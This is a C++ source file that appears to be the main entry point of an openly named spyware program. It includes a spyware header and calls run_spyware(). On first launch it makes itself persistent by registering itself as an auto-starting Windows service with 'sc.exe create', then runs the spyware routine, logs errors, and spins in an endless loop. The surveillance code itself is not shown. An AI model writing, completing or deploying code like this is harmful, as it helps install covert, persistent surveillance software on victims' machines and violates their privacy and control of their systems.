#include <iostream>
#include <exception>

#include "config.h"
#include "core/spyware.hpp"
#include "core/debug.hpp"

int main (int argc, char *argv[]) {
    std::string exePath (argv[0]);
    std::string firstArgs = argc > 1 ? std::string(std::string(argv[1])) : "";
    
    if (argc < 1 || firstArgs.compare("--run") != 0) {
        std::string registerServiceCmd = "sc.exe create ";
        
        registerServiceCmd += PROGRAM_NAME;
        registerServiceCmd += " start=auto binpath=";
        registerServiceCmd += "\"" + exePath + " --run\""; 

        std::system(registerServiceCmd.c_str());
    }

    try {
        return run_spyware();
    } catch (std::exception ex) {
        std::string message(ex.what());
        debug(message, LEVEL_CRITICAL);
    } catch (const char *ex) {
        std::string message(ex);
        debug(message, LEVEL_CRITICAL);
    }

    while (true) {}

    return EXIT_FAILURE;
}